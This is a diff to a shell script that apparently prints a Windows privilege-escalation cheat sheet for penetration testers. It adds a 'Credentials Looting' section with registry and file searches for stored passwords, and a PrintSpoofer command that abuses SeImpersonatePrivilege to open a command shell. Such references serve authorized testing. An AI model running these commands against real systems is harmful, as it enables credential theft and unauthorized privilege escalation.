@@ -80,7 +80,16 @@ echo -e "${Point} reg query HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows\\\I
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}Credentials Looting${End} ${Frame}###${End}"
+# echo -e "${Point} findstr /si password *.txt"
+# echo -e "${Point} dir /s *pass* == *cred* == *vnc* == *.config*"
+# echo -e "${Point} findstr /spin \"password\" *.* ${Comment}# find all passwords in all files.${End}"
+echo -e "${Point} reg query HKLM /f pass /t REG_SZ /s ${Comment}# credentials in Registry.${End}"
+echo -e "${Point} reg query HKCU /f pass /t REG_SZ /s ${Comment}# credentials in Registry.${End}"
+echo -e ""
 
 
-
+echo -e "${Frame}###${End} ${Title}SeImpersonatePrivilege${End} ${Frame}###${End}"
+echo -e "${Point} .\PrintSpoofer64.exe -i -c cmd"
+echo -e ""
 
